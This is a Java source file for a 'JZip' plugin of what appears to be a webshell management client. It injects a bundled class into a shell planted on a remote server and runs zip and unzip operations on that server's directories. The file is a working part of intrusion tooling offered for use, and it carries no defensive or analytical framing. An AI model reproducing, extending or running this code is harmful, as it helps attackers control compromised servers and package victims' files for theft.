package vip.youwe.shell.shells.plugins.java;

import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.component.GBC;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.InputStream;

@PluginnAnnotation(payloadName = "JavaDynamicPayload", Name = "JZip")
public class JZip implements Plugin {

    private static final String CLASS_NAME = "JZip";
    private ShellEntity shellEntity;
    private Payload payload;
    private JPanel panel = new JPanel(new GridBagLayout());
    private JLabel compressSrcDirLabel;
    private JLabel compressDestFileLabel;
    private JTextField compressDestFileTextField;
    private JTextField compressSrcDirTextField;

    private JButton zipButton;
    private JButton unZipButton;
    private Encoding encoding;
    private boolean loadState;

    public JZip() {

        GBC gbcLCompressSrcDir = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
        GBC gbcCompressSrcDir = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
        GBC gbcLCompressDestFileLabel = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
        GBC gbcCompressDestFile = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
        GBC gbcZipButton = (new GBC(0, 2)).setInsets(5, -20, 0, 0);
        GBC gbcUnZipButton = (new GBC(0, 2, 5, 1)).setInsets(5, 20, 0, 0);

        this.compressSrcDirLabel = new JLabel("目标文件夹");
        this.compressDestFileLabel = new JLabel("压缩文件");
        this.zipButton = new JButton("压缩");
        this.unZipButton = new JButton("解压");

        this.compressSrcDirTextField = new JTextField(50);
        this.compressDestFileTextField = new JTextField(50);
        this.panel.add(this.compressSrcDirLabel, gbcLCompressSrcDir);
        this.panel.add(this.compressSrcDirTextField, gbcCompressSrcDir);
        this.panel.add(this.compressDestFileLabel, gbcLCompressDestFileLabel);
        this.panel.add(this.compressDestFileTextField, gbcCompressDestFile);
        this.panel.add(this.zipButton, gbcZipButton);
        this.panel.add(this.unZipButton, gbcUnZipButton);
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.classs", CLASS_NAME));
                byte[] binCode = functions.readInputStream(inputStream);
                inputStream.close();
                this.loadState = this.payload.include(CLASS_NAME, binCode);
                if (this.loadState) {
                    Log.log("Load success");
                } else {
                    Log.log("Load fail");
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private void zipButtonClick(ActionEvent actionEvent) {
        load();
        if (this.compressDestFileTextField.getText().trim().length() > 0
                && this.compressSrcDirTextField.getText().trim().length() > 0) {
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("compressFile", this.compressDestFileTextField.getText().trim());
            reqParameter.add("compressDir", this.compressSrcDirTextField.getText().trim());
            String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "zip", reqParameter));
            JOptionPane.showMessageDialog(null, resultString, "提示", 1);
        } else {
            JOptionPane.showMessageDialog(null, "请检查是否填写完整", "提示", 1);
        }
    }

    private void unZipButtonClick(ActionEvent actionEvent) {
        load();
        if (this.compressDestFileTextField.getText().trim().length() > 0
                && this.compressSrcDirTextField.getText().trim().length() > 0) {
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("compressFile", this.compressDestFileTextField.getText().trim());
            reqParameter.add("compressDir", this.compressSrcDirTextField.getText().trim());
            String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "unZip", reqParameter));
            JOptionPane.showMessageDialog(null, resultString, "提示", 1);
        } else {
            JOptionPane.showMessageDialog(null, "请检查是否填写完整", "提示", 1);
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        this.compressSrcDirTextField.setText(this.payload.currentDir());
        this.compressDestFileTextField.setText(String.valueOf(this.payload.currentDir()) + functions.getLastFileName(this.payload.currentDir()) + ".zip");

        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

}
